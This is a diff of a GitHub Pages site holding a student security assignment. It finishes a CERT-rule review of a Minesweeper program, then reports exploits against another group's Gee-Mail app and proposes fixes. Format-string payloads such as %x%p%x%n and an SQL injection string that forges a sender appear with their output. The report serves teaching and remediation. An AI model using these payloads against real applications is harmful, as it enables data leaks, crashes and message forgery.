+    cout &lt;&lt; <span class="pl-s"><span class="pl-pds">"</span>Memory Error: <span class="pl-pds">"</span></span> &lt;&lt; e.<span class="pl-c1">what</span>() &lt;&lt; endl;
+    <span class="pl-k">return</span> <span class="pl-c1">2</span>;
+} <span class="pl-k">catch</span> (runtime_error <span class="pl-k">const</span> &amp;e){
+    cout &lt;&lt; <span class="pl-s"><span class="pl-pds">"</span>Runtime Error: <span class="pl-pds">"</span></span> &lt;&lt; e.<span class="pl-c1">what</span>() &lt;&lt; endl;
+    <span class="pl-k">return</span> <span class="pl-c1">3</span>;
+} <span class="pl-k">catch</span> (exception <span class="pl-k">const</span> &amp;e){
+    cout &lt;&lt; <span class="pl-s"><span class="pl-pds">"</span>Other Error: <span class="pl-pds">"</span></span> &lt;&lt; e.<span class="pl-c1">what</span>() &lt;&lt; endl;
+    <span class="pl-k">return</span> <span class="pl-c1">4</span>;
+}</pre></div>
+</li>
+<li><p>(+20pts) DCL50-CPP. Do not define a C-style variadic function
+Their code does not define C-style variadic functions</p></li>
+<li>
+<p>(+20pts) DCL58-CPP. Do not modify the standard namespaces
+Their code does not modify standard namespaces</p>
+
+<div class="highlight highlight-source-c++"><pre><span class="pl-k">using</span> <span class="pl-k">namespace</span> <span class="pl-en">std</span><span class="pl-k">;</span></pre></div>
+</li>
+<li><p>(0pts) DCL59-CPP. Do not define an unnamed namespace in a header file
+Their code does not include a header file so this is satisfied</p></li>
+<li>
+<p>(+20pts) DCL60-CPP. Obey the One-Definition Rule
+Their code does not have multiple definitions with the same name</p>
+
+<div class="highlight highlight-source-c++"><pre><span class="pl-k">struct</span> <span class="pl-en">Spot</span>{
+<span class="pl-k">int</span> value;
+<span class="pl-k">bool</span> isBomb;
+<span class="pl-k">bool</span> isRevealed;
+<span class="pl-k">bool</span> isFlagged;
+<span class="pl-en">Spot</span>(){
+    isBomb = <span class="pl-c1">false</span>;
+    isRevealed = <span class="pl-c1">false</span>;
+    isFlagged = <span class="pl-c1">false</span>;
+    value = <span class="pl-c1">0</span>;
+};
+<span class="pl-en">~Spot</span>(){};
+
+<span class="pl-k">bool</span> <span class="pl-en">Click</span>(<span class="pl-k">bool</span> flag){
+    <span class="pl-c">//a regular click</span>
+    <span class="pl-k">if</span>(!flag &amp;&amp; !isFlagged){ <span class="pl-c">//click it, click it good</span>
+    isRevealed = <span class="pl-c1">true</span>;
+    <span class="pl-k">return</span> isBomb;
+    }
+    <span class="pl-c">//a flag click</span>
+    <span class="pl-k">if</span>(flag){
+        isFlagged = !isFlagged;  <span class="pl-c">//toggle flag</span>
+        <span class="pl-k">return</span> <span class="pl-c1">false</span>;
+    }
+}
+<span class="pl-c">//sets bomb to true</span>
+<span class="pl-k">void</span> <span class="pl-en">Bomb</span>(){
+    isBomb = <span class="pl-c1">true</span>;
+}
+
+};</pre></div>
+</li>
+</ul>
 
 <h3>
-<a id="authors-and-contributors" class="anchor" href="#authors-and-contributors" aria-hidden="true"><span aria-hidden="true" class="octicon octicon-link"></span></a>Authors and Contributors</h3>
+<a id="gee-mail---a-secure-asynchronous-message-platform" class="anchor" href="#gee-mail---a-secure-asynchronous-message-platform" aria-hidden="true"><span aria-hidden="true" class="octicon octicon-link"></span></a>Gee-Mail - a secure asynchronous message platform</h3>
 
-<p>You can @mention a GitHub username to generate a link to their profile. The resulting <code>&lt;a&gt;</code> element will link to the contributor’s GitHub Profile. For example: In 2007, Chris Wanstrath (<a href="https://github.com/defunkt" class="user-mention">@defunkt</a>), PJ Hyett (<a href="https://github.com/pjhyett" class="user-mention">@pjhyett</a>), and Tom Preston-Werner (<a href="https://github.com/mojombo" class="user-mention">@mojombo</a>) founded GitHub.</p>
+<h5>
+<a id="overview-3" class="anchor" href="#overview-3" aria-hidden="true"><span aria-hidden="true" class="octicon octicon-link"></span></a>Overview</h5>
+
+<p>This project had two parts, the first part was to create a secure asynchronous message platform that would prompt the user to sign-in or register a new account.  When logging in, the password is to be validated and if login fails, an appropriate response would be generated.  Once logged in, that user will be presented with the number of messages they have along with a list of the users that sent them a message.  Then the user will be prompted to read or write a message.  When writing a message, the user would be prompted for the receipients username, the message, and a shared passphrase.  When the user reads a message, the user will be prompted to enter the passphrase before showing the message in plaintext.  The second part involved exchanging our Gee-Mail application with that of another group and document exploit vulnerabilities and violations of all CERT rules</p>
+
+<h5>
+<a id="accomplishments-2" class="anchor" href="#accomplishments-2" aria-hidden="true"><span aria-hidden="true" class="octicon octicon-link"></span></a>Accomplishments</h5>
+
+<p>Not only were we able to deliver a fully functional Gee-Mail application, we also added the ability to delete messages, preset all messages with read or not read status, and deploy our application to a web server under two different methods.  A detailed summary of our api can be seen here: <a href="https://github.com/kkatayama/Gee-Mail">https://github.com/kkatayama/Gee-Mail</a>.  Our working web connector code can be seen here: <a href="https://github.com/alparslansari/gee-web-mail">https://github.com/alparslansari/gee-web-mail</a>.  As for part 2, we found several vulnerabilities and were able to exploit them.  Below is our results.</p>
 
 <h3>
-<a id="support-or-contact" class="anchor" href="#support-or-contact" aria-hidden="true"><span aria-hidden="true" class="octicon octicon-link"></span></a>Support or Contact</h3>
+<a id="unintended-behaviors-with-normal-inputs" class="anchor" href="#unintended-behaviors-with-normal-inputs" aria-hidden="true"><span aria-hidden="true" class="octicon octicon-link"></span></a>Unintended behaviors with normal inputs</h3>
 
-<p>Having trouble with Pages? Check out our <a href="https://help.github.com/pages">documentation</a> or <a href="https://github.com/contact">contact support</a> and we’ll help you sort it out.</p>
-      </section>
-      <footer>
-        <p><small>Hosted on GitHub Pages &mdash; Theme by <a href="https://twitter.com/michigangraham">mattgraham</a></small></p>
+<blockquote>
+<h3>
+<a id="design-flaw-all-users-have-access-to-other-users-emails" class="anchor" href="#design-flaw-all-users-have-access-to-other-users-emails" aria-hidden="true"><span aria-hidden="true" class="octicon octicon-link"></span></a>Design Flaw: All users have access to other user's emails</h3>
+
+<p>If you log in as a normal user and select to read an email you will be preseneted with the number of emails that exist in the database and asked to enter an email id.  This id is the actual id stored in the database so a user could enter an id that belongs to an email of another user and attempt to read it.  Here we log in as <code>teddy</code> and attempt to read an email sent from <code>alp</code> to <code>kevin</code>!</p>
+
+<div class="highlight highlight-source-shell"><pre>$ ./geemail
+Please enter 0 <span class="pl-k">for</span> register or 1 <span class="pl-k">for</span> login: 1
+Please enter your username: teddy
+Please enter your password: password
+You logged <span class="pl-k">in</span> successfully<span class="pl-k">!</span>
+ID = 1
+SENDER = alp
+TITLE = Hello Teddy
+
+Number of Emails: 3
+Please enter 1 <span class="pl-k">if</span> you want to <span class="pl-c1">read</span>, enter 0 <span class="pl-k">if</span> you want to write, or 2 to quit: 1
+Please enter an email id: 2
+Please enter a secret passphrase: secret
+Your message: Hello Alp, this is Kevin<span class="pl-k">!</span>
+Please enter 1 <span class="pl-k">if</span> you want to <span class="pl-c1">read</span>, enter 0 <span class="pl-k">if</span> you want to write, or 2 to quit: 2</pre></div>
+
+<h3>
+<a id="program-sends-unintended-corrupted-email-creates-unintended-user-and-crashes-when-input-is-a-character" class="anchor" href="#program-sends-unintended-corrupted-email-creates-unintended-user-and-crashes-when-input-is-a-character" aria-hidden="true"><span aria-hidden="true" class="octicon octicon-link"></span></a>Program sends unintended corrupted email, creates unintended user, and crashes when input is a character</h3>
+
+<p>When you run the program, if you input any character as your choice, the program will create a blank user into the database and send a corrputed email.  If you try this a second time, the program will get stuck in a loop trying to create this blank user until it crashes.  To demo this we use the character <code>a</code></p>
+
+<h4>
+<a id="first-run" class="anchor" href="#first-run" aria-hidden="true"><span aria-hidden="true" class="octicon octicon-link"></span></a>First Run</h4>
+
+<div class="highlight highlight-source-shell"><pre>$ ./geemail
+Please enter 0 <span class="pl-k">for</span> register or 1 <span class="pl-k">for</span> login: a
+Please enter a new username: Please enter your password: Number of Emails: 0
+Please enter 1 <span class="pl-k">if</span> you want to <span class="pl-c1">read</span>, enter 0 <span class="pl-k">if</span> you want to write, or 2 to quit: Please enter your recipient: Please enter your title: Please enter your secret passphrase: Enter the message 
+Your Message: 
+Message Sent :)
+Please enter 1 <span class="pl-k">if</span> you want to <span class="pl-c1">read</span>, enter 0 <span class="pl-k">if</span> you want to write, or 2 to quit: Please enter an email id: Please enter a secret passphrase: Your message: 
+Please enter 1 <span class="pl-k">if</span> you want to <span class="pl-c1">read</span>, enter 0 <span class="pl-k">if</span> you want to write, or 2 to quit: <span class="pl-c">#</span></pre></div>
+
+<h4>
+<a id="database-shows-new-user-created-and-corrupted-email-sent-id--4" class="anchor" href="#database-shows-new-user-created-and-corrupted-email-sent-id--4" aria-hidden="true"><span aria-hidden="true" class="octicon octicon-link"></span></a>Database shows new user created and corrupted email sent <code>id = 4</code>
+</h4>
+
+<div class="highlight highlight-source-sql"><pre>sqlite<span class="pl-k">&gt;</span> <span class="pl-k">select</span> <span class="pl-k">*</span> <span class="pl-k">from</span> emails; <span class="pl-k">select</span> <span class="pl-k">*</span> <span class="pl-k">from</span> users;
+<span class="pl-c1">1</span>|teddy|alp|Hello Teddy|F2C6108389DAF19A54250A255A03A81522917E84F3D3BC4CEF
+<span class="pl-c1">2</span>|alp|kevin|Hello Alp|F2C6108389DAE493406D537D121EB35C38C237BCB6E4B952EF
+<span class="pl-c1">3</span>|kevin|teddy|Hello Kevin|F2CA5C84838CCC911C611B660D57A10E34916E98A6ADF54CEB68E7EB68DAC1DFE906
+<span class="pl-c1">4</span><span class="pl-k">||||</span>P�
+<span class="pl-c1">1</span>|teddy|5E884898DA28047151D0E56F8DC6292773603D0D6AABBDD62A11EF721D1542D8
+<span class="pl-c1">2</span>|alp|5E884898DA28047151D0E56F8DC6292773603D0D6AABBDD62A11EF721D1542D8
+<span class="pl-c1">3</span>|kevin|5E884898DA28047151D0E56F8DC6292773603D0D6AABBDD62A11EF721D1542D8
+<span class="pl-c1">4</span><span class="pl-k">||</span>E3B0C44298FC1C149AFBF4C8996FB92427AE41E4649B934CA495991B7852B855</pre></div>
+
+<h4>
+<a id="second-run" class="anchor" href="#second-run" aria-hidden="true"><span aria-hidden="true" class="octicon octicon-link"></span></a>Second Run</h4>
+
+<div class="highlight highlight-source-shell"><pre>$ ./geemail
+Please enter 0 <span class="pl-k">for</span> register or 1 <span class="pl-k">for</span> login: a
+Please enter a new username: User already exists. Try again.
+Please enter a new username: User already exists. Try again.
+Please enter a new username: User already exists. Try again.
+...
+
+Program received signal SIGSEGV, Segmentation fault.
+0x00007fff8b91733b <span class="pl-k">in</span> <span class="pl-en">unixOpen</span> () from /usr/lib/libsqlite3.dylib</pre></div>
+</blockquote>
+
+<h3>
+<a id="program-is-vulnerable-to-string-format-exploit" class="anchor" href="#program-is-vulnerable-to-string-format-exploit" aria-hidden="true"><span aria-hidden="true" class="octicon octicon-link"></span></a>Program is vulnerable to string format exploit</h3>
+
+<blockquote>
+<h3>
+<a id="program-crash-after-attempting-to-modify-object-after-being-freed" class="anchor" href="#program-crash-after-attempting-to-modify-object-after-being-freed" aria-hidden="true"><span aria-hidden="true" class="octicon octicon-link"></span></a>Program crash after attempting to modify object after being freed</h3>
+
+<p>If you log in as a normal user and select to read an email but use C format strings in the passphrase input, the program attempts to modify the object after being freed</p>
+
+<h4>
+<a id="input" class="anchor" href="#input" aria-hidden="true"><span aria-hidden="true" class="octicon octicon-link"></span></a>Input</h4>
+
+<div class="highlight highlight-source-shell"><pre>$ ./geemail
+Please enter 0 <span class="pl-k">for</span> register or 1 <span class="pl-k">for</span> login: 1
+Please enter your username: teddy
+Please enter your password: password
+You logged <span class="pl-k">in</span> successfully<span class="pl-k">!</span>
+ID = 1
+SENDER = alp
+TITLE = Hello Teddy
+
+Number of Emails: 3
+Please enter 1 <span class="pl-k">if</span> you want to <span class="pl-c1">read</span>, enter 0 <span class="pl-k">if</span> you want to write, or 2 to quit: 1
+Please enter an email id: 1
+Please enter a secret passphrase: %x%p%x%n%p%p%p%p</pre></div>
+
+<h4>
+<a id="osx-output" class="anchor" href="#osx-output" aria-hidden="true"><span aria-hidden="true" class="octicon octicon-link"></span></a>osx Output</h4>
+
+<div class="highlight highlight-source-shell"><pre>Please enter a secret passphrase: %x%p%x%n%p%p%p%p
+geemail(48247,0x7fff7b3b1000) malloc: <span class="pl-k">***</span> error <span class="pl-k">for</span> object 0x7feb63403220: incorrect checksum <span class="pl-k">for</span> freed object - object was probably modified   after being freed.
+<span class="pl-k">***</span> <span class="pl-c1">set</span> a breakpoint <span class="pl-k">in</span> malloc_error_break to debug
+[1]    48247 abort      ./geemail</pre></div>
+
+<h4>
+<a id="cloud9-output" class="anchor" href="#cloud9-output" aria-hidden="true"><span aria-hidden="true" class="octicon octicon-link"></span></a>cloud9 output</h4>
+
+<div class="highlight highlight-source-shell"><pre>Please enter a secret passphrase: %x%p%x%n%p%p%p%p
+<span class="pl-k">***</span> Error <span class="pl-k">in</span> <span class="pl-s"><span class="pl-pds">`</span>./geemail<span class="pl-s"><span class="pl-pds">'</span>: free(): invalid next size (fast): 0x00000000006db7e0 ***</span></span>
+<span class="pl-s"><span class="pl-s">Aborted</span></span></pre></div>
+
+<h3>
+<a id="program-leaks-memory-and-sends-massive-spam-emails-after-reading-email-containing-string-format-variables" class="anchor" href="#program-leaks-memory-and-sends-massive-spam-emails-after-reading-email-containing-string-format-variables" aria-hidden="true"><span aria-hidden="true" class="octicon octicon-link"></span></a>Program leaks memory and sends massive spam emails after reading email containing string format variables</h3>
+
+<p>If you log in as a normal user and send an email that contains string format variables, when any user reads that email, data can be leaked and massive spam emails could be sent.  For this demo we use this as our string format test <code>%p%p%p%p%p%n</code>.</p>
+
+<div class="highlight highlight-source-shell"><pre>$ ./geemail
+Please enter 0 <span class="pl-k">for</span> register or 1 <span class="pl-k">for</span> login: 1
+Please enter your username: teddy
+Please enter your password: password
+You logged <span class="pl-k">in</span> successfully<span class="pl-k">!</span>
+ID = 1
+SENDER = alp
+TITLE = Hello Teddy
+
+Number of Emails: 3
+Please enter 1 <span class="pl-k">if</span> you want to <span class="pl-c1">read</span>, enter 0 <span class="pl-k">if</span> you want to write, or 2 to quit: 0
+Please enter your recipient: teddy
+Please enter your title: %p%p%p%p%p%n %p%p%p%p%p%n
+Please enter your secret passphrase: secret
+Enter the message
+hello %p%p%p%p%p%n %p%p%p%p%p%n %p%p%p%p%p%n %p%p%p%p%p%n %p%p%p%p%p%n %p%p%p%p%p%n
+Your Message: hello %p%p%p%p%p%n %p%p%p%p%p%n %p%p%p%p%p%n %p%p%p%p%p%n %p%p%p%p%p%n %p%p%p%p%p%n
+Message Sent :)
+Please enter 1 <span class="pl-k">if</span> you want to <span class="pl-c1">read</span>, enter 0 <span class="pl-k">if</span> you want to write, or 2 to quit: 2
+
+$ ./geemail
+Please enter 0 <span class="pl-k">for</span> register or 1 <span class="pl-k">for</span> login: 1
+Please enter your username: teddy
+Please enter your password: password
+You logged <span class="pl-k">in</span> successfully<span class="pl-k">!</span>
+ID = 1
+SENDER = alp
+TITLE = Hello Teddy
+
+Number of Emails: 3
+Please enter 1 <span class="pl-k">if</span> you want to <span class="pl-c1">read</span>, enter 0 <span class="pl-k">if</span> you want to write, or 2 to quit: 1
+Please enter an email id: 49
+Please enter a secret passphrase: secret
+Your message: hello %p%p%p%p%p%n %p%p%p%p%p%n %p%p%p%p%p%n %p%p%p%p%p%n %p%p%p%p%p%n %p%p%p%p%p%ngmail.db</pre></div>
+
+<p>Here we can see <strong>gmail.db</strong> is revealed which is the actual name for the database file.  Each run may reveal other informaion, such as the current directory of the application, etc.  At this point, the application is in a state that can't process the string format variables properly.  If you input any character when asked to <code>read, write, or quit</code>, that user will send massive spam emails until memory is exhausted and program crashes.  The database file increases in size quite quickly.</p>
+
+<div class="highlight highlight-source-shell"><pre>Please enter 1 <span class="pl-k">if</span> you want to <span class="pl-c1">read</span>, enter 0 <span class="pl-k">if</span> you want to write, or 2 to quit: a
+Please enter your recipient: Please enter your title: Please enter your secret passphrase: Enter the message
+Your Message:
+Message Sent :)
+Please enter 1 <span class="pl-k">if</span> you want to <span class="pl-c1">read</span>, enter 0 <span class="pl-k">if</span> you want to write, or 2 to quit: Please enter an email id: Please enter a secret passp��hǱ�]<span class="pl-s"><span class="pl-pds">`</span>:Z�<span class="pl-c">#��essage: \^k</span></span>
+<span class="pl-s"><span class="pl-c">             b!é��M�|�(�ްb��!�H:R߅�]l Ԏ�</span></span>
+<span class="pl-s"><span class="pl-c">                                       �ٶe��G��r@&amp;�@�+�\���\Jgmail.db</span></span>
+<span class="pl-s"><span class="pl-c">Please enter 1 if you want to read, enter 0 if you want to write, or 2 to quit: Please enter your recipient: Please enter your title: Please enter your secret passphrase: Enter the message</span></span>
+<span class="pl-s"><span class="pl-c">Your Message:</span></span>
+<span class="pl-s"><span class="pl-c">Message Sent :)</span></span>
+<span class="pl-s"><span class="pl-c">Please enter 1 if you want to read, enter 0 if you want to write, or 2 to quit: Please enter an email id: Please enter a secret passp��hǱ�]</span><span class="pl-pds">`</span></span>:Z�<span class="pl-c">#��essage: \^k</span>
+             b<span class="pl-k">!</span>é��M�<span class="pl-k">|</span>�(�ްb��<span class="pl-k">!</span>�H:R߅�]l Ԏ�
+                                       �ٶe��G��r@<span class="pl-k">&amp;</span>�@�+�<span class="pl-cce">\�</span>��<span class="pl-cce">\J</span>
+Message Sent :)
+Please enter 1 <span class="pl-k">if</span> you want to <span class="pl-c1">read</span>, enter 0 <span class="pl-k">if</span> you want to write, or 2 to quit: Please enter your recipient: Please enter your title: Please enter your secret passphrase: Enter the message
+Your Message:
+geemail(83110,0x7fff7b3b1000) malloc: <span class="pl-k">***</span> error <span class="pl-k">for</span> object 0x103001560: incorrect checksum <span class="pl-k">for</span> freed object - object was probably modified after being freed.
+<span class="pl-k">***</span> <span class="pl-c1">set</span> a breakpoint <span class="pl-k">in</span> malloc_error_break to debug
+[New Thread 0x3583 of process 83110]
+
+Thread 1 received signal SIGABRT, Aborted.
+0x00007fff9fbb4f06 <span class="pl-k">in</span> <span class="pl-en">__pthread_kill</span> () from /usr/lib/system/libsystem_kernel.dylib
+$</pre></div>
+
+<p>Now if we look at the database, we will see over 10,000 emails were sent and stored with corrupted data:</p>
+
+<div class="highlight highlight-source-sql"><pre><span class="pl-k">select</span> <span class="pl-k">*</span> <span class="pl-k">from</span> emails;
+...
+<span class="pl-c1">12306</span><span class="pl-k">||</span>teddy<span class="pl-k">||</span>�m�
+<span class="pl-c1">12307</span><span class="pl-k">||</span>teddy<span class="pl-k">||</span>���
+<span class="pl-c1">12308</span><span class="pl-k">||</span>teddy<span class="pl-k">||</span>���
+<span class="pl-c1">12309</span><span class="pl-k">||</span>teddy<span class="pl-k">||</span>���
+<span class="pl-c1">12310</span><span class="pl-k">||</span>teddy<span class="pl-k">||</span>�@�</pre></div>
+</blockquote>
+
+<h3>
+<a id="progarm-is-vulnerable-to-sql-injection" class="anchor" href="#progarm-is-vulnerable-to-sql-injection" aria-hidden="true"><span aria-hidden="true" class="octicon octicon-link"></span></a>Progarm is vulnerable to SQL injection</h3>
+
+<blockquote>
+<h4>
+<a id="all-queries-use-quotations-around-variables" class="anchor" href="#all-queries-use-quotations-around-variables" aria-hidden="true"><span aria-hidden="true" class="octicon octicon-link"></span></a>All queries use quotations around variables</h4>
+
+<p>An example of this is seen on line 425:</p>
+
+<div class="highlight highlight-source-c++"><pre>string query = <span class="pl-s"><span class="pl-pds">"</span>INSERT INTO EMAILS (RECIPIENT, SENDER, TITLE, MESSAGE) VALUES ('<span class="pl-pds">"</span></span> + recip + <span class="pl-s"><span class="pl-pds">"</span>', '<span class="pl-pds">"</span></span> + username + <span class="pl-s"><span class="pl-pds">"</span>', '<span class="pl-pds">"</span></span> + title + <span class="pl-s"><span class="pl-pds">"</span>', '<span class="pl-pds">"</span></span> + decryptedMess + <span class="pl-s"><span class="pl-pds">"</span>');<span class="pl-pds">"</span></span>;</pre></div>
+
+<p>In this example we will log in as <code>teddy</code> and send an email to <code>kevin</code> from <code>alp</code>.  We will send the message <code>Hello kevin, this is alp... but is this really alp?</code> encrypted with salsa20 using the IV of <code>AAAAAAAA</code> and passphrase <code>secret</code>.  The application does not randomize the IV and uses <code>AAAAAAAA</code>.</p>
+
+<div class="highlight highlight-source-sql"><pre>$ .<span class="pl-k">/</span>geemail
+Please enter <span class="pl-c1">0</span> for register <span class="pl-k">or</span> <span class="pl-c1">1</span> for login: <span class="pl-c1">1</span>
+Please enter your username: teddy
+Please enter your password: password
+You logged <span class="pl-k">in</span> successfully!
+ID <span class="pl-k">=</span> <span class="pl-c1">1</span>
+SENDER <span class="pl-k">=</span> alp
+TITLE <span class="pl-k">=</span> Hello Teddy
+
+<span class="pl-k">Number</span> of Emails: <span class="pl-c1">3</span>
+Please enter <span class="pl-c1">1</span> if you want to read, enter <span class="pl-c1">0</span> if you want to write, <span class="pl-k">or</span> <span class="pl-c1">2</span> to quit: <span class="pl-c1">0</span>
+Please enter your recipient: teddy teddy<span class="pl-s"><span class="pl-pds">'</span>,<span class="pl-pds">'</span><span class="pl-pds">'</span>); SELECT * FROM emails; INSERT INTO emails (RECIPIENT, SENDER, TITLE, MESSAGE) VALUES ("kevin","alp","hello kevin","F2C6108389DACE9A46281D255A03A81522917E84F3F3BC4CE036ECBB2FDF908FA51B5566F68ED16764E2A2FC94622345BD1641"); SELECT * FROM emails;--</span>
+<span class="pl-s">Please enter your title: Please enter your secret passphrase: blah blah</span>
+<span class="pl-s">Enter the message</span>
+<span class="pl-s">Your Message: blah</span>
+<span class="pl-s">ID = 1</span>
+<span class="pl-s">RECIPIENT = teddy</span>
+<span class="pl-s">SENDER = alp</span>
+<span class="pl-s">TITLE = Hello Teddy</span>
+<span class="pl-s">MESSAGE = F2C6108389DAF19A54250A255A03A81522917E84F3D3BC4CEF</span>
+<span class="pl-s"></span>
+<span class="pl-s">ID = 2</span>
+<span class="pl-s">RECIPIENT = alp</span>
+<span class="pl-s">SENDER = kevin</span>
+<span class="pl-s">TITLE = Hello Alp</span>
+<span class="pl-s">MESSAGE = F2C6108389DAE493406D537D121EB35C38C237BCB6E4B952EF</span>
+<span class="pl-s"></span>
+<span class="pl-s">ID = 3</span>
+<span class="pl-s">RECIPIENT = kevin</span>
+<span class="pl-s">SENDER = teddy</span>
+<span class="pl-s">TITLE = Hello Kevin</span>
+<span class="pl-s">MESSAGE = F2CA5C84838CCC911C611B660D57A10E34916E98A6ADF54CEB68E7EB68DAC1DFE906</span>
+<span class="pl-s"></span>
+<span class="pl-s">ID = 4</span>
+<span class="pl-s">RECIPIENT = teddy</span>
+<span class="pl-s">SENDER = teddy</span>
+<span class="pl-s">TITLE = teddy</span>
+<span class="pl-s">MESSAGE =</span>
+<span class="pl-s"></span>
+<span class="pl-s">ID = 1</span>
+<span class="pl-s">RECIPIENT = teddy</span>
+<span class="pl-s">SENDER = alp</span>
+<span class="pl-s">TITLE = Hello Teddy</span>
+<span class="pl-s">MESSAGE = F2C6108389DAF19A54250A255A03A81522917E84F3D3BC4CEF</span>
+<span class="pl-s"></span>
+<span class="pl-s">ID = 2</span>
+<span class="pl-s">RECIPIENT = alp</span>
+<span class="pl-s">SENDER = kevin</span>
+<span class="pl-s">TITLE = Hello Alp</span>
+<span class="pl-s">MESSAGE = F2C6108389DAE493406D537D121EB35C38C237BCB6E4B952EF</span>
+<span class="pl-s"></span>
+<span class="pl-s">ID = 3</span>
+<span class="pl-s">RECIPIENT = kevin</span>
+<span class="pl-s">SENDER = teddy</span>
+<span class="pl-s">TITLE = Hello Kevin</span>
+<span class="pl-s">MESSAGE = F2CA5C84838CCC911C611B660D57A10E34916E98A6ADF54CEB68E7EB68DAC1DFE906</span>
+<span class="pl-s"></span>
+<span class="pl-s">ID = 4</span>
+<span class="pl-s">RECIPIENT = teddy</span>
+<span class="pl-s">SENDER = teddy</span>
+<span class="pl-s">TITLE = teddy</span>
+<span class="pl-s">MESSAGE =</span>
+<span class="pl-s"></span>
+<span class="pl-s">ID = 5</span>
+<span class="pl-s">RECIPIENT = kevin</span>
+<span class="pl-s">SENDER = alp</span>
+<span class="pl-s">TITLE = hello kevin</span>
+<span class="pl-s">MESSAGE = F2C6108389DACE9A46281D255A03A81522917E84F3F3BC4CE036ECBB2FDF908FA51B5566F68ED16764E2A2FC94622345BD1641</span>
+<span class="pl-s"></span>
+<span class="pl-s">Message Sent :)</span>
+<span class="pl-s">Please enter 1 if you want to read, enter 0 if you want to write, or 2 to quit: 2</span>
+<span class="pl-s">$</span></pre></div>
+
+<p>If successful, then <code>kevin</code> should be able to log in and see a new message from <code>alp</code>.  Logging in as <code>kevin</code> this is what we saw :)</p>
+
+<div class="highlight highlight-source-shell"><pre>$ ./geemail
+Please enter 0 <span class="pl-k">for</span> register or 1 <span class="pl-k">for</span> login: 1
+Please enter your username: kevin
+Please enter your password: password
+You logged <span class="pl-k">in</span> successfully<span class="pl-k">!</span>
+ID = 5
+SENDER = alp
+TITLE = hello kevin
+
+ID = 3
+SENDER = teddy
+TITLE = Hello Kevin
+
+Number of Emails: 3
+Please enter 1 <span class="pl-k">if</span> you want to <span class="pl-c1">read</span>, enter 0 <span class="pl-k">if</span> you want to write, or 2 to quit: 1
+Please enter an email id: 5
+Please enter a secret passphrase: secret
+Your message: Hello kevin, this is alp... but is this really alp<span class="pl-k">?</span>
+Please enter 1 <span class="pl-k">if</span> you want to <span class="pl-c1">read</span>, enter 0 <span class="pl-k">if</span> you want to write, or 2 to quit: 2
+$</pre></div>
+</blockquote>
+
+<h3>
+<a id="cert-rule-recommendations" class="anchor" href="#cert-rule-recommendations" aria-hidden="true"><span aria-hidden="true" class="octicon octicon-link"></span></a>CERT Rule Recommendations</h3>
+
+<blockquote>
+<ul>
+<li>MEM31-C. Free dynamically allocated memory when no longer needed</li>
+</ul>
+
+<div class="highlight highlight-source-shell"><pre>    char <span class="pl-k">*</span> returnBuffer = (char <span class="pl-k">*</span>) malloc(txtLength<span class="pl-k">*</span>2)<span class="pl-k">;</span>
+
+    memset(returnBuffer, 0, txtLength<span class="pl-k">*</span>2)<span class="pl-k">;</span>
+    <span class="pl-k">for</span> (index = 0<span class="pl-k">;</span> index<span class="pl-k">&lt;</span>txtLength<span class="pl-k">;</span> index++) {
+        sprintf(returnBuffer + index<span class="pl-k">*</span>2, <span class="pl-s"><span class="pl-pds">"</span>%02X<span class="pl-pds">"</span></span>, (unsigned char)encBuffer[index])<span class="pl-k">;</span>
+    }
+    string result(returnBuffer)<span class="pl-k">;</span>
+    free(encBuffer)<span class="pl-k">;</span>
+    <span class="pl-k">return</span> result<span class="pl-k">;</span></pre></div>
+
+<p>From line 199 to 207, they allocated returnBuffer but forgot free it.</p>
+
+<ul>
+<li>STR31-C. Guarantee that storage for strings has sufficient space for character data and the null terminator</li>
+</ul>
+
+<div class="highlight highlight-source-shell"><pre>    <span class="pl-k">for</span> (index = 0<span class="pl-k">;</span> index<span class="pl-k">&lt;</span>32<span class="pl-k">;</span> index++) {
+        sprintf(buffer + index<span class="pl-k">*</span>2, <span class="pl-s"><span class="pl-pds">"</span>%02X<span class="pl-pds">"</span></span>, (unsigned char)hashBuffer[index])<span class="pl-k">;</span>
+    }</pre></div>
+
+<p>Line 329-331,here  sprintf() function makes no guarantees regarding the length of the generated string.</p>
+
+<ul>
+<li>
+<p>MSC24-C. Do not use deprecated or obsolescent functions</p>
+
+<p>strcpy() was used in many places of the application, it is recommended to use strcpy_s() instead</p>
+</li>
+<li>
+<p>EXP05-CPP. Do not use C-style casts</p>
+
+<p>Throughout the application, both <code>(c style)</code> and <code>&lt;c++ style&gt;</code> casts were used.  It is recommended that you use <code>&lt;c++ style&gt;</code> casts.</p>
+</li>
+</ul>
+</blockquote>
+
+<h3>
+<a id="recommended-fixes-to-vulnerabilities" class="anchor" href="#recommended-fixes-to-vulnerabilities" aria-hidden="true"><span aria-hidden="true" class="octicon octicon-link"></span></a>Recommended Fixes to Vulnerabilities</h3>
+
+<blockquote>
+<h3>
+<a id="character-input-fix" class="anchor" href="#character-input-fix" aria-hidden="true"><span aria-hidden="true" class="octicon octicon-link"></span></a>Character Input Fix</h3>
+
+<h5>
+<a id="modify-loginorregister-and-readorwrite" class="anchor" href="#modify-loginorregister-and-readorwrite" aria-hidden="true"><span aria-hidden="true" class="octicon octicon-link"></span></a>Modify loginOrRegister() and readOrWrite()</h5>
+
+<div class="highlight highlight-source-shell"><pre>string <span class="pl-en">loginOrRegister</span>() {
+        // Prompt user <span class="pl-k">for</span> “login” or “register”
+        int isLogin<span class="pl-k">;</span>
+        cout <span class="pl-k">&lt;&lt;</span> <span class="pl-s"><span class="pl-pds">"</span>Please enter 0 for register or 1 for login: <span class="pl-pds">"</span></span><span class="pl-k">;</span>
+        cin <span class="pl-k">&gt;&gt;</span> isLogin<span class="pl-k">;</span>
+        <span class="pl-k">if</span> (isLogin) {
+                <span class="pl-k">if</span>(<span class="pl-en">login</span>()){
+                        cout<span class="pl-k">&lt;&lt;</span> <span class="pl-s"><span class="pl-pds">"</span>You logged in successfully!<span class="pl-pds">"</span></span> <span class="pl-s"><span class="pl-k">&lt;&lt;</span><span class="pl-k">endl</span>;</span>
+<span class="pl-s">                }</span>
+<span class="pl-s">                else{</span>
+<span class="pl-s">                        cout &lt;&lt; "Wrong info!" &lt;&lt;endl;</span>
+<span class="pl-s">                        loginOrRegister();</span>
+<span class="pl-s">                }</span>
+<span class="pl-s">        }</span>
+<span class="pl-s">        else{</span>
+<span class="pl-s">                username = registerUser();</span>
+<span class="pl-s">        }</span>
+<span class="pl-s">        return username;</span>
+<span class="pl-s">}</span>
+<span class="pl-s"></span>
+<span class="pl-s">int readOrWrite() {</span>
+<span class="pl-s">        //Return 1 if they want to read, 0 if they want to write;</span>
+<span class="pl-s">        int rorW;</span>
